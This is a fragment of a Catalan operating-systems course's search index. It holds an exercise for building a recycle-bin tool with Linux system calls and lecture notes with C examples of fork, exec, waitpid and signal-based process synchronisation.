    "text": "Tasques\n\nObtenint informació de l’usuari\nEl primer pas per implementar rmsf és obtenir informació sobre l’usuari que executa el programa. En particular, necessitem saber quin és el seu directori home per poder crear la paperera allà. Necessitem consultar dues crides a sistema per aconseguir-ho: getuid() i getpwuid().\n\n\n\n\n\n\nConsell\n\n\n\nAquestes crides a sistema es defineixen als fitxers d’encapçalament &lt;unistd.h&gt; i &lt;pwd.h&gt;, respectivament i es poden consultar a la pàgina del manual: man 2 getuid i man 3 getpwuid.\n\n\nConstrueix el programa whoami.c que imprimeix el nom de l’usuari actual.\n\n\nComprovant si un directori existeix\nAbans de moure res, hem de saber si la paperera ($HOME/.trash) existeix. Per això, utilitzarem la crida a sistema stat(), que ens permet obtenir informació sobre un fitxer o directori. Per veure com funciona, consulta la pàgina del manual: man 2 stat.\nConstrueix el programa mystat.c que comprova si un directori existeix amb stat().\nConstrueix també una versió alternativa mystat2.c que utilitzi opendir() per comprovar l’existència del directori. Consulta la pàgina del manual: man 3 opendir.\n\n\n\n\n\n\nConsellSeccions del manual\n\n\n\nLa diferencia entre la secció 2 i la 3 del manual és que la primera fa referència a crides a sistema (sistema operatiu) i la segona a funcions de la biblioteca estàndard de C.\n\n\n\n\nConcatenant rutes\nPer construir la ruta completa de la paperera ($HOME/.trash), necessitem concatenar cadenes. Una cadena fixa (“.trash”) amb la cadena que representa el directori home de l’usuari. La biblioteca estàndard de C proporciona diverses funcions per treballar amb cadenes, com strcat(), strcpy(), i sprintf().\nCrear un petit programa que concateni el home de l’usuari amb la cadena “.trash”. Peer fer-ho, utilitzarem memòria dinàmica amb malloc() per reservar l’espai necessari per a la cadena resultant i free() per alliberar-la després d’usar-la.\n\n\nCreant directoris\nPer poder veure la informació de la crida a sistema mkdir() fem man 2 mkdir.\nImplementa el programa mkd.c que donat un directori comprovi si existeix i si no el crei amb tots els permisos per l’usuari i sense permisos pel grup i altres.\n\n\nMovent fitxers i directoris\nPer moure fitxers, utilitzarem la crida a sistema rename(), que permet canviar el nom o la ubicació d’un fitxer o directori. Consulta la pàgina del manual: man 2 rename.\nImplementa el programa mymv.c que mogui un fitxer a la paperera. Pode assumir que la paperera ja existeix.\n\n\nImplementant rmsf\nAmb totes les peces anteriors, ja podem muntar rmsf. Implementa el programa rmsf.c.\n\n\nExercicis Opcionals\n\nPuja el codi rmsf.c al repositori.\nImplementa un Makefile per compilar i executar el programa.\nActualitzeu el programa utilitzant la llibreria getopt per poder passar opcions com:\n\n-h per mostrar l’ajuda.\n-v per mostrar la versió.\n-d per enviar a la paperera de reciclatge fitxers i directoris.\n-r per recuperar fitxers i directoris de la paperera de reciclatge a la seva ubicació original.\n-t per mostrar la ubicació de la paperera de reciclatge.\n\nAfegiu una opció per preguntar a l’usuari si vol enviar a la paperera cada fitxer o directori. I en cas afirmatiu, enviar-lo. En cas negatiu, no fer res. Aquesta opció pot estar activada per defecte i es pot desactivar amb l’opció -y.\nInvestiga com crear una realsease a GitHub i crea una release amb el teu codi anomenada v1.0.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF · Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "notes/03-process.html",
    "href": "notes/03-process.html",
    "title": "Creació i gestió de processos",
    "section": "",
    "text": "En aquests apunts veurem un exemple en C al user space de com es creen i gestionen processos amb fork(), com s’executen nous programes amb exec() i com es pot esperar que un procés fill acabi amb wait().\nA més, aprendrem a utilitzar senyals per sincronitzar processos..",
    "crumbs": [
      "Apunts",
      "Unitat 03 · Gestió de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#enunciat",
    "href": "notes/03-process.html#enunciat",
    "title": "Creació i gestió de processos",
    "section": "Enunciat",
    "text": "Enunciat\nVolem implementar un programa en C que permeti generar bitllets de loteria de forma concurrent.\nEl programa principal (pare) ha de generar 5 processos fills que s’encarregaran de generar els números del bitllet.\nCada procés fill: - genera un número aleatori entre 0 i 9,\n- el retorna al pare com a codi de sortida (exit(status)).\nEl procés pare: - espera tots els fills (waitpid()),\n- recull els números i construeix el bitllet de loteria (un nombre de 5 dígits).\n\n\n\n\n\n %%| echo: false\n\nsequenceDiagram\n    autonumber\n    participant P as Pare\n    participant F1 as Fill 1\n    participant F2 as Fill 2\n    participant F3 as Fill 3\n    participant F4 as Fill 4\n    participant F5 as Fill 5\n\n    P-&gt;&gt;F1: fork()\n    P-&gt;&gt;F2: fork()\n    P-&gt;&gt;F3: fork()\n    P-&gt;&gt;F4: fork()\n    P-&gt;&gt;F5: fork()\n\n    F1--&gt;&gt;F1: genera num1\n    F2--&gt;&gt;F2: genera num2\n    F3--&gt;&gt;F3: genera num3\n    F4--&gt;&gt;F4: genera num4\n    F5--&gt;&gt;F5: genera num5\n\n    F1--&gt;&gt;P: exit(num1)\n    F2--&gt;&gt;P: exit(num2)\n    F3--&gt;&gt;P: exit(num3)\n    F4--&gt;&gt;P: exit(num4)\n    F5--&gt;&gt;P: exit(num5)\n\n    P-&gt;&gt;P: waitpid() i recull num1, num2, num3, num4, num5\n    P-&gt;&gt;P: construir bitllet i mostrar\n    P-&gt;&gt;P: exit()",
    "crumbs": [
      "Apunts",
      "Unitat 03 · Gestió de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#solució-bàsica",
    "href": "notes/03-process.html#solució-bàsica",
    "title": "Creació i gestió de processos",
    "section": "Solució bàsica",
    "text": "Solució bàsica\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\n#define NUM_FILLS 5\n\nint main() {\n    pid_t pid;\n    int i, status;\n    int bitllet = 0;\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            srand(time(NULL) ^ getpid());\n            int num = rand() % 10;\n            printf(\"Fill PID %d genera %d\\n\", getpid(), num);\n            exit(num);\n        }\n    }\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(-1, &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet final del pare: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 · Gestió de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#ús-de-exec-separació-de-responsabilitats",
    "href": "notes/03-process.html#ús-de-exec-separació-de-responsabilitats",
    "title": "Creació i gestió de processos",
    "section": "Ús de exec(): separació de responsabilitats",
    "text": "Ús de exec(): separació de responsabilitats\nAra volem que cada fill executi un programa separat (generador) que genera el número aleatori. De forma que el procés fill només s’encarrega de crear un nou procés amb exec() i el programa generador s’encarrega de generar el número aleatori i finalitzar amb exit(num).\nEl codi del programa generador seria:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    srand(time(NULL) ^ getpid()); \n    int num = rand() % 10; \n    exit(num);\n}\nEl codi del procés main (pare) es modificaria per utilitzar exec():\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\n#define NUM_FILLS 5\n\nint main() {\n    pid_t pid;\n    int i, status;\n    int bitllet = 0;\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            execl(\"./generador\", \"generador\", NULL);\n            perror(\"execl error\"); \n            exit(1);\n        }\n    }\n\n    for (i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(-1, &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet de loteria del pare: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 · Gestió de processos amb C (userspace)"
    ]
  },
  {
    "objectID": "notes/03-process.html#sincronització-amb-senyals",
    "href": "notes/03-process.html#sincronització-amb-senyals",
    "title": "Creació i gestió de processos",
    "section": "Sincronització amb senyals",
    "text": "Sincronització amb senyals\nAra volem que el fill no generi el número fins que el pare li doni permís.\n\nQuan un fill s’inicia, envia un senyal SIGUSR2 al pare per indicar-li ja estic preparat per generar el número.\nEl para, en rebre aquest senyal, envia un senyal SIGUSR1 al fill per indicar-li que ja pot generar el número.\nEl fill quan rep el senyal SIGUSR1, genera el número i finalitza amb exit(num).\n\n\n\n\n\n\n %%| echo: false\n sequenceDiagram\n    autonumber\n    participant P as Pare\n    participant F as Fill\n\n    P-&gt;&gt;F: fork()\n    F-&gt;&gt;P: SIGUSR2 · estic llest\n    P-&gt;&gt;F: SIGUSR1 · ja pots generar\n    F-&gt;&gt;F: Genera número\n    F-&gt;&gt;P: exit(num)\n    P-&gt;&gt;P: waitpid() recull resultat\n\n\n\n\n\n\nEl nou codi de generador_senyal seria:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;time.h&gt;\n\nvoid generate_number() {\n    srand(time(NULL) ^ getpid());\n    int num = rand() % 10;\n    printf(\"Fill PID %d genera %d\\n\", getpid(), num);\n    exit(num);\n}\n\nvoid handler(int sig) {\n    if (sig == SIGUSR1) generate_number();\n}\n\nint main() {\n    signal(SIGUSR1, handler);\n\n    kill(getppid(), SIGUSR2);\n\n    while (1) pause();\n}\nEl codi del procés pare es modificaria per gestionar les senyals:\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;signal.h&gt;\n\n#define NUM_FILLS 5\n\nvolatile sig_atomic_t ready_fills = 0;\n\nvoid sigusr2_handler(int sig) {\n    ready_fills++;\n}\n\nint main() {\n    pid_t pid;\n    int status;\n    int bitllet = 0;\n\n    signal(SIGUSR2, sigusr2_handler);\n\n    pid_t fills[NUM_FILLS];\n\n    for (int i = 0; i &lt; NUM_FILLS; i++) {\n        pid = fork();\n        if (pid &lt; 0) {\n            perror(\"fork error\");\n            exit(1);\n        } else if (pid == 0) {\n            execl(\"./generador_senyal\", \"generador_senyal\", NULL);\n            perror(\"execl error\");\n            exit(1);\n        } else {\n            fills[i] = pid;\n            while (ready_fills &lt;= i) pause();  // Espera que el fill estigui llest\n            kill(pid, SIGUSR1);                // Envia permís al fill\n        }\n    }\n\n    for (int i = 0; i &lt; NUM_FILLS; i++) {\n        pid_t child_pid = waitpid(fills[i], &status, 0);\n        if (WIFEXITED(status)) {\n            int num = WEXITSTATUS(status);\n            printf(\"Pare recull fill PID %d amb %d\\n\", child_pid, num);\n            bitllet = bitllet * 10 + num;\n        }\n    }\n\n    printf(\"Bitllet de loteria final: %05d\\n\", bitllet);\n    return 0;\n}",
    "crumbs": [
      "Apunts",
      "Unitat 03 · Gestió de processos amb C (userspace)"
    ]
  }
]